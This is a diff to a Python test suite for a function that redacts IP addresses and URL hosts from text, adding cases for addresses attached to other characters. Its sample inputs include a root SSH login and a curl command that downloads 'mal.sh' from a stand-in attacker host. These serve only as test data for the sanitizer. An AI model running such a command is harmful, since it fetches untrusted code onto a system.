@@ -9,6 +9,16 @@ def test_tapa_direcciones_ipv4() -> None:
     assert privacidad.sin_direcciones("ssh root@203.0.113.9") == "ssh root@x.x.x.x"
 
 
+def test_tapa_una_direccion_pegada_a_letras_o_guiones_bajos() -> None:
+    assert privacidad.sin_direcciones("MGLNDD_203.0.113.10_22") == "MGLNDD_x.x.x.x_22"
+    assert privacidad.sin_direcciones("Host: 198.51.100.7rnrn") == "Host: x.x.x.xrnrn"
+
+
+def test_no_tapa_a_medias_un_numero_con_mas_cifras() -> None:
+    for texto in ("1234.5.6.7", "1.2.3.4567"):
+        assert privacidad.sin_direcciones(texto) == texto
+
+
 def test_tapa_el_host_de_una_url_pero_deja_el_esquema_y_la_ruta() -> None:
     assert privacidad.sin_direcciones("curl -O http://evil.example.com:8080/mal.sh") == (
         "curl -O http://tapado/mal.sh"
